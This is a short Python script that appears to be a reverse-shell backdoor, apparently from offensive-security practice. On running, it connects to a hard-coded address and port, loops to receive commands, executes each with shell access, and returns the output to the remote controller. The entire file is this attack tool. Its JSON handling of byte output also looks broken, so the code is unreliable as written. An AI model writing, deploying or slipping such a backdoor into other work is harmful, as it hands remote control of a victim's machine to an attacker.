import socket
import subprocess
import json
import base64

class MySocket:
	def __init__(self, ip, port):
		self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.my_connection.connect((ip,port))

	def command_exe(self, command):
		return subprocess.check_output(command, shell=True)

	def json_send(self, data):
		json_data_1 = json.dumps(data)
		#json_data_1_encoded = json_data_1.encode('ascii')
		self.my_connection.send(json_data_1.encode())

	def json_receive(self):
		json_data_2 = self.my_connection.recv(1024)
		#json_data_2_decoded = json_data_2.decode('ascii')
		return json.loads(json_data_2)

	def start_socket(self):
		while True:
			command = self.json_receive()
			command_output = self.command_exe(command)
			#print(command_output)
			self.json_send(command_output)
		self.my_connection.close()

my_socket_connection = MySocket("192.168.0.112",7777)
my_socket_connection.start_socket()
